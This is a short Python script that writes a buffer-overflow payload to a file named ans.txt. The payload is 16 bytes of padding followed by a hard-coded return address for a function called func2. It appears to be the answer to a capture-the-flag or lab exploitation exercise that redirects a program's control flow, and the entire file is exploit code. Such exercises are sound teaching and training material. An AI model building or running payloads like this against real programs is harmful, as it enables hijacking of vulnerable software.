padding = b"\x00" * 16
func2_address = b"\x4c\x12\x40\x00\x00\x00\x00\x00"
payload = padding + func2_address
with open("ans.txt", "wb") as f:
    f.write(payload)
print("Payload written to ans.txt")
